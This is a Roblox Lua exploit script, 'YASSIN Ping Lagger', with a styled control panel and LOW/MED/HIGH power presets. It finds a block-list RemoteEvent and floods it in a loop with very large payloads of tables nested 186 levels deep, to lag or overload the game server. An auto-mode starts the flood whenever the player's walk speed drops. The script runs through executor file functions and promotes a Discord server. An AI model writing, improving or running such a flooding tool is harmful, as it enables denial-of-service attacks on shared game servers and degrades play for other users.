--[[
    YASSIN Ping Lagger
    YASSIN Ping Lagger (depth 186)
    الشكل: Galaxy + LOW / MED / HIGH
]]

local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")

local plr    = Players.LocalPlayer
local plrGui = plr:WaitForChild("PlayerGui")

if _G.YassinPingLaggerStop then
    pcall(_G.YassinPingLaggerStop)
end
_G.YassinPingLaggerActive  = false
_G.YassinPingLaggerRunning = false

local CONFIG_FILE = "YassinPingLagger_Config.json"

local DEFAULT_CFG = {
    power        = 100000,
    interval     = 0.125,
    keybindKb    = "M",
    autoBrainrot = true,
    preset       = "MED",
}

local cfg = {
    power        = DEFAULT_CFG.power,
    interval     = DEFAULT_CFG.interval,
    keybindKb    = DEFAULT_CFG.keybindKb,
    autoBrainrot = true,
    preset       = DEFAULT_CFG.preset,
}

local keybind = Enum.KeyCode.M
local listeningForInput = false
local uiLocked = false
local active = false
local remote = nil
local brainrotMode = false
local lastBrainrotState = false
local manualOverride = false
local pingLoopRunning = false
local hbConn = nil
local inputConn = nil
local savedPos = nil
local mainFrame = nil

local C = {
    bg      = Color3.fromRGB(90, 12, 18),
    header  = Color3.fromRGB(120, 16, 22),
    card    = Color3.fromRGB(110, 20, 28),
    purple  = Color3.fromRGB(220, 50, 60),
    purple2 = Color3.fromRGB(255, 80, 90),
    white   = Color3.fromRGB(255, 235, 235),
    dim     = Color3.fromRGB(200, 140, 140),
    green   = Color3.fromRGB(80, 255, 140),
    red     = Color3.fromRGB(255, 70, 100),
    low     = Color3.fromRGB(60, 200, 120),
    med     = Color3.fromRGB(255, 90, 90),
    high    = Color3.fromRGB(255, 50, 70),
}

local function saveConfig()
    local data = {
        power        = cfg.power,
        interval     = cfg.interval,
        keybindKb    = cfg.keybindKb,
        autoBrainrot = true,
        preset       = cfg.preset,
        keybind      = keybind.Name,
        uiLocked     = uiLocked == true,
    }
    if mainFrame then
        data.posXScale  = mainFrame.Position.X.Scale
        data.posXOffset = mainFrame.Position.X.Offset
        data.posYScale  = mainFrame.Position.Y.Scale
        data.posYOffset = mainFrame.Position.Y.Offset
    elseif savedPos then
        data.posXScale  = savedPos.X_Scale
        data.posXOffset = savedPos.X_Offset
        data.posYScale  = savedPos.Y_Scale
        data.posYOffset = savedPos.Y_Offset
    end
    local ok, encoded = pcall(function() return HttpService:JSONEncode(data) end)
    if not ok or not encoded then return end
    if writefile then
        pcall(writefile, CONFIG_FILE, encoded)
    elseif syn and syn.write_file then
        pcall(syn.write_file, CONFIG_FILE, encoded)
    end
end

local function loadConfig()
    local raw = nil
    if isfile and readfile and isfile(CONFIG_FILE) then
        local ok, content = pcall(readfile, CONFIG_FILE)
        if ok then raw = content end
    elseif syn and syn.read_file then
        local ok, content = pcall(syn.read_file, CONFIG_FILE)
        if ok then raw = content end
    end
    if not raw then return end
    local ok, data = pcall(function() return HttpService:JSONDecode(raw) end)
    if not ok or type(data) ~= "table" then return end

    if data.power then cfg.power = tonumber(data.power) or cfg.power end
    if data.interval then cfg.interval = tonumber(data.interval) or cfg.interval end
    if type(data.keybindKb) == "string" then cfg.keybindKb = data.keybindKb end
    cfg.autoBrainrot = true
    if type(data.preset) == "string" then cfg.preset = data.preset end
    if data.keybind and Enum.KeyCode[data.keybind] then
        keybind = Enum.KeyCode[data.keybind]
        cfg.keybindKb = data.keybind
    elseif cfg.keybindKb and Enum.KeyCode[cfg.keybindKb] then
        keybind = Enum.KeyCode[cfg.keybindKb]
    end
    if data.posXScale ~= nil then
        savedPos = {
            X_Scale  = data.posXScale,
            X_Offset = data.posXOffset or 0,
            Y_Scale  = data.posYScale or 0.5,
            Y_Offset = data.posYOffset or 0,
        }
    end
    if data.uiLocked ~= nil then
        uiLocked = data.uiLocked == true
    end
end
loadConfig()

for _, kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "YassinPingLaggerGui" or kid.Name == "YassinPingLaggerGui" then
        kid:Destroy()
    end
end

local screen = Instance.new("ScreenGui")
screen.Name = "YassinPingLaggerGui"
screen.ResetOnSpawn = false
screen.DisplayOrder = 15
screen.Parent = plrGui

local function tw(obj, props, t)
    TweenService:Create(obj, TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end

local function isGamepadKeyCode(kc)
    if not kc then return false end
    local name = kc.Name
    return name:find("Button") == 1 or name == "DPadUp" or name == "DPadDown"
        or name == "DPadLeft" or name == "DPadRight" or name == "ButtonSelect"
        or name == "ButtonStart" or name == "Thumbstick1" or name == "Thumbstick2"
end

local BLACKLISTED = {
    [Enum.KeyCode.Escape] = true,
    [Enum.KeyCode.LeftControl] = true,
    [Enum.KeyCode.Unknown] = true,
}

local MAIN_W, MAIN_H = 260, 175

mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
if savedPos then
    mainFrame.Position = UDim2.new(savedPos.X_Scale, savedPos.X_Offset, savedPos.Y_Scale, savedPos.Y_Offset)
else
    mainFrame.Position = UDim2.new(0.5, -MAIN_W/2, 0.5, -MAIN_H/2)
end
mainFrame.BackgroundColor3 = C.bg
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.ClipsDescendants = true
mainFrame.Parent = screen
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)

local mainStroke = Instance.new("UIStroke", mainFrame)
mainStroke.Color = C.purple
mainStroke.Thickness = 1.8

do
    local dragging, dragStart, startPos
    mainFrame.InputBegan:Connect(function(i)
        if uiLocked then return end
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = i.Position
            startPos = mainFrame.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    if not uiLocked then
                        savedPos = {
                            X_Scale  = mainFrame.Position.X.Scale,
                            X_Offset = mainFrame.Position.X.Offset,
                            Y_Scale  = mainFrame.Position.Y.Scale,
                            Y_Offset = mainFrame.Position.Y.Offset,
                        }
                        saveConfig()
                    end
                end
            end)
        end
    end)
    mainFrame.InputChanged:Connect(function(i)
        if uiLocked then dragging = false return end
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            local d = i.Position - dragStart
            mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

local header = Instance.new("Frame", mainFrame)
header.Size = UDim2.new(1, 0, 0, 34)
header.BackgroundColor3 = C.header
header.BorderSizePixel = 0
header.ZIndex = 2
Instance.new("UICorner", header).CornerRadius = UDim.new(0, 14)

local headerFill = Instance.new("Frame", mainFrame)
headerFill.Size = UDim2.new(1, 0, 0, 10)
headerFill.Position = UDim2.new(0, 0, 0, 24)
headerFill.BackgroundColor3 = C.header
headerFill.BorderSizePixel = 0
headerFill.ZIndex = 2

local titleLbl = Instance.new("TextLabel", header)
titleLbl.Size = UDim2.new(1, -120, 1, 0)
titleLbl.Position = UDim2.new(0, 12, 0, 0)
titleLbl.BackgroundTransparency = 1
titleLbl.Text = "YASSIN PING LAGGER"
titleLbl.TextColor3 = C.white
titleLbl.Font = Enum.Font.GothamBlack
titleLbl.TextSize = 12
titleLbl.TextXAlignment = Enum.TextXAlignment.Left
titleLbl.ZIndex = 3

local statusPill = Instance.new("Frame", header)
statusPill.Size = UDim2.new(0, 36, 0, 18)
statusPill.Position = UDim2.new(1, -108, 0.5, -9)
statusPill.BackgroundColor3 = Color3.fromRGB(90, 20, 25)
statusPill.BorderSizePixel = 0
statusPill.ZIndex = 3
Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1, 0)

local statusLbl = Instance.new("TextLabel", statusPill)
statusLbl.Size = UDim2.new(1, 0, 1, 0)
statusLbl.BackgroundTransparency = 1
statusLbl.Text = "OFF"
statusLbl.TextColor3 = C.red
statusLbl.Font = Enum.Font.GothamBlack
statusLbl.TextSize = 9
statusLbl.ZIndex = 4

-- مربع الكي
local keybindBtn = Instance.new("TextButton", header)
keybindBtn.Size = UDim2.new(0, 34, 0, 20)
keybindBtn.Position = UDim2.new(1, -70, 0.5, -10)
keybindBtn.BackgroundColor3 = Color3.fromRGB(130, 25, 30)
keybindBtn.BorderSizePixel = 0
keybindBtn.AutoButtonColor = false
do
    local display = keybind.Name
    if display:match("Button") then display = display:gsub("Button", "") end
    if #display > 4 then display = display:sub(1, 4) end
    keybindBtn.Text = display
end
keybindBtn.TextColor3 = C.white
keybindBtn.Font = Enum.Font.GothamBlack
keybindBtn.TextSize = 10
keybindBtn.ZIndex = 5
Instance.new("UICorner", keybindBtn).CornerRadius = UDim.new(0, 5)
local keyStroke = Instance.new("UIStroke", keybindBtn)
keyStroke.Color = C.purple
keyStroke.Thickness = 1

-- زر القفل
local lockBtn = Instance.new("TextButton", header)
lockBtn.Size = UDim2.new(0, 24, 0, 24)
lockBtn.Position = UDim2.new(1, -28, 0.5, -12)
lockBtn.BackgroundColor3 = Color3.fromRGB(130, 25, 30)
lockBtn.BorderSizePixel = 0
lockBtn.AutoButtonColor = false
lockBtn.Text = uiLocked and "🔒" or "🔓"
lockBtn.TextColor3 = uiLocked and Color3.fromRGB(255, 200, 80) or C.white
lockBtn.Font = Enum.Font.GothamBold
lockBtn.TextSize = 13
lockBtn.ZIndex = 5
Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(0, 6)
local lockStroke = Instance.new("UIStroke", lockBtn)
lockStroke.Color = uiLocked and Color3.fromRGB(255, 200, 80) or C.purple
lockStroke.Thickness = 1.2

local function updateLockVisual()
    lockBtn.Text = uiLocked and "🔒" or "🔓"
    lockBtn.TextColor3 = uiLocked and Color3.fromRGB(255, 200, 80) or C.white
    lockStroke.Color = uiLocked and Color3.fromRGB(255, 200, 80) or C.purple
end

local function updateKeybindVisual()
    local display = keybind.Name
    if display:match("Button") then display = display:gsub("Button", "") end
    if #display > 4 then display = display:sub(1, 4) end
    keybindBtn.Text = listeningForInput and "..." or display
    keybindBtn.BackgroundColor3 = listeningForInput and Color3.fromRGB(160, 30, 40) or Color3.fromRGB(130, 25, 30)
end

lockBtn.MouseButton1Click:Connect(function()
    uiLocked = not uiLocked
    updateLockVisual()
    saveConfig()
end)

keybindBtn.MouseButton1Click:Connect(function()
    if uiLocked then return end
    if listeningForInput then return end
    listeningForInput = true
    updateKeybindVisual()
end)

local activateBtn = Instance.new("TextButton", mainFrame)
activateBtn.Size = UDim2.new(1, -24, 0, 42)
activateBtn.Position = UDim2.new(0, 12, 0, 44)
activateBtn.BackgroundColor3 = C.card
activateBtn.BorderSizePixel = 0
activateBtn.AutoButtonColor = false
activateBtn.Text = ""
activateBtn.ZIndex = 3
Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0, 10)

local activateStroke = Instance.new("UIStroke", activateBtn)
activateStroke.Color = C.purple2
activateStroke.Thickness = 1.4
activateStroke.Transparency = 0.3

local activateLbl = Instance.new("TextLabel", activateBtn)
activateLbl.Size = UDim2.new(1, 0, 1, 0)
activateLbl.BackgroundTransparency = 1
activateLbl.Text = "ACTIVATE"
activateLbl.TextColor3 = C.white
activateLbl.Font = Enum.Font.GothamBlack
activateLbl.TextSize = 16
activateLbl.ZIndex = 5

local presetFrame = Instance.new("Frame", mainFrame)
presetFrame.Size = UDim2.new(1, -24, 0, 28)
presetFrame.Position = UDim2.new(0, 12, 0, 96)
presetFrame.BackgroundTransparency = 1
presetFrame.ZIndex = 3

local function makePresetBtn(text, xScale, color)
    local btn = Instance.new("TextButton", presetFrame)
    btn.Size = UDim2.new(0.31, 0, 1, 0)
    btn.Position = UDim2.new(xScale, 0, 0, 0)
    btn.BackgroundColor3 = Color3.fromRGB(100, 18, 22)
    btn.BorderSizePixel = 0
    btn.AutoButtonColor = false
    btn.Text = text
    btn.TextColor3 = color
    btn.Font = Enum.Font.GothamBlack
    btn.TextSize = 12
    btn.ZIndex = 4
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 7)
    local s = Instance.new("UIStroke", btn)
    s.Color = color
    s.Thickness = 1.2
    s.Transparency = 0.4
    return btn, s
end

local lowBtn, lowStroke   = makePresetBtn("LOW",  0.00, C.low)
local medBtn, medStroke   = makePresetBtn("MED",  0.345, C.med)
local highBtn, highStroke = makePresetBtn("HIGH", 0.69, C.high)

local footer = Instance.new("TextLabel", mainFrame)
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0, 0, 1, -22)
footer.BackgroundTransparency = 1
footer.Text = "discord.gg/gAm4Pmmdh"
footer.TextColor3 = C.dim
footer.Font = Enum.Font.Gotham
footer.TextSize = 11
footer.ZIndex = 3

-- Settings panel removed
local powerBox, delayBox = nil, nil
local settingsFrame = { Visible = false }

local function updateUI()
    if active then
        activateLbl.Text = "ACTIVATED"
        activateLbl.TextColor3 = C.green
        activateStroke.Color = C.green
        activateStroke.Transparency = 0
        statusLbl.Text = "ON"
        statusLbl.TextColor3 = C.green
        statusPill.BackgroundColor3 = Color3.fromRGB(30, 70, 40)
        mainStroke.Color = C.green
    else
        activateLbl.Text = "ACTIVATE"
        activateLbl.TextColor3 = C.white
        activateStroke.Color = C.purple2
        activateStroke.Transparency = 0.3
        statusLbl.Text = "OFF"
        statusLbl.TextColor3 = C.red
        statusPill.BackgroundColor3 = Color3.fromRGB(90, 20, 25)
        mainStroke.Color = C.purple
    end

    local function setPresetStyle(btn, stroke, isActive, color)
        if isActive then
            btn.BackgroundColor3 = color
            btn.TextColor3 = Color3.fromRGB(40, 8, 10)
            stroke.Transparency = 0
            stroke.Color = color
        else
            btn.BackgroundColor3 = Color3.fromRGB(100, 18, 22)
            btn.TextColor3 = color
            stroke.Transparency = 0.4
            stroke.Color = color
        end
    end
    setPresetStyle(lowBtn,  lowStroke,  cfg.preset == "LOW",  C.low)
    setPresetStyle(medBtn,  medStroke,  cfg.preset == "MED",  C.med)
    setPresetStyle(highBtn, highStroke, cfg.preset == "HIGH", C.high)
end

local function applyPreset(name)
    if name == "LOW" then
        cfg.power = 70000
        cfg.interval = 0.125
    elseif name == "MED" then
        cfg.power = 100000
        cfg.interval = 0.125
    elseif name == "HIGH" then
        cfg.power = 150000
        cfg.interval = 0.125
    end
    cfg.preset = name
    if powerBox then powerBox.Text = tostring(cfg.power) end
    if delayBox then delayBox.Text = tostring(cfg.interval) end
    updateUI()
    saveConfig()
end

local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if rrs then
        for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
            local r = rrs:FindFirstChild(name)
            if r and r:IsA("RemoteEvent") then return r end
        end
        for _, c in ipairs(rrs:GetChildren()) do
            if c:IsA("RemoteEvent") and c.Name:find("Block") then return c end
        end
    end
    local rs = game:FindFirstChild("ReplicatedStorage") or game:GetService("ReplicatedStorage")
    if rs then
        for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
            local r = rs:FindFirstChild(name)
            if r and r:IsA("RemoteEvent") then return r end
        end
        for _, c in ipairs(rs:GetDescendants()) do
            if c:IsA("RemoteEvent") and (c.Name:lower():find("block") or c.Name:lower():find("list")) then
                return c
            end
        end
    end
    return nil
end

-- ===== القوة الأصلية (depth 186) YASSIN =====
local function buildPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / 188), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local function runPingLoop()
    if not active or not remote then
        pingLoopRunning = false
        return
    end
    pingLoopRunning = true
    local delay = cfg.interval or 0.125
    while active and remote and pingLoopRunning and _G.YassinPingLaggerRunning do
        if not active or not _G.YassinPingLaggerActive then break end
        local payload = buildPayload(cfg.power)
        local ok = pcall(function()
            remote:FireServer(payload)
        end)
        if not ok then
            delay = math.min(delay * 1.5, 0.5)
        else
            delay = math.max(delay * 0.995, 0.05)
        end
        task.wait(delay)
    end
    pingLoopRunning = false
end

function flipLag(state, isManual)
    if not state and pingLoopRunning then
        pingLoopRunning = false
    end
    active = state and true or false
    _G.YassinPingLaggerActive = active

    if isManual then
        if brainrotMode then
            manualOverride = not state
        else
            manualOverride = false
        end
    end

    if active then
        if not remote then
            remote = findRemote()
            if not remote then
                active = false
                _G.YassinPingLaggerActive = false
                updateUI()
                return
            end
        end
        updateUI()
        task.spawn(runPingLoop)
    else
        updateUI()
    end
end

local function startAutoBrainrotWatch()
    if hbConn then
        pcall(function() hbConn:Disconnect() end)
        hbConn = nil
    end
    cfg.autoBrainrot = true
    hbConn = RunService.Heartbeat:Connect(function()
        if not cfg.autoBrainrot then return end
        local char = plr.Character
        if not char then return end
        local hum = char:FindFirstChild("Humanoid")
        if not hum then return end

        if hum.WalkSpeed < 25 then
            if not lastBrainrotState then
                brainrotMode = true
                lastBrainrotState = true
                manualOverride = false
                if not active then
                    flipLag(true, false)
                end
            end
        else
            if lastBrainrotState then
                brainrotMode = false
                lastBrainrotState = false
                if active and not manualOverride then
                    flipLag(false, false)
                end
                manualOverride = false
            end
        end
    end)
end
startAutoBrainrotWatch()

inputConn = UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    local kc = input.KeyCode
    if kc == Enum.KeyCode.Unknown then return end

    if listeningForInput then
        local isKb = input.UserInputType == Enum.UserInputType.Keyboard
        local isGp = isGamepadKeyCode(kc)
        if (isKb or isGp) and not BLACKLISTED[kc] then
            keybind = kc
            cfg.keybindKb = keybind.Name
            listeningForInput = false
            updateKeybindVisual()
            saveConfig()
        end
        return
    end

    if kc == Enum.KeyCode.LeftControl then
        mainFrame.Visible = not mainFrame.Visible
        if not mainFrame.Visible then
            settingsFrame.Visible = false
        end
        return
    end

    if kc == keybind then
        flipLag(not active, true)
    end
end)

activateBtn.MouseButton1Click:Connect(function()
    flipLag(not active, true)
end)

lowBtn.MouseButton1Click:Connect(function() applyPreset("LOW") end)
medBtn.MouseButton1Click:Connect(function() applyPreset("MED") end)
highBtn.MouseButton1Click:Connect(function() applyPreset("HIGH") end)

_G.YassinPingLaggerStop = function()
    active = false
    _G.YassinPingLaggerActive = false
    _G.YassinPingLaggerRunning = false
    pingLoopRunning = false
    pcall(function() if hbConn then hbConn:Disconnect() end end)
    pcall(function() if inputConn then inputConn:Disconnect() end end)
    pcall(function()
        local g = plrGui:FindFirstChild("YassinPingLaggerGui")
        if g then g:Destroy() end
    end)
end

_G.YassinPingLaggerRunning = true
_G.YassinPingLaggerActive = false

task.wait(0.3)
active = false
pingLoopRunning = false
updateLockVisual()
updateKeybindVisual()
updateUI()
saveConfig()

print("[YASSIN] Galaxy + Original Power (depth 186) | Power=" .. cfg.power .. " Delay=" .. cfg.interval)
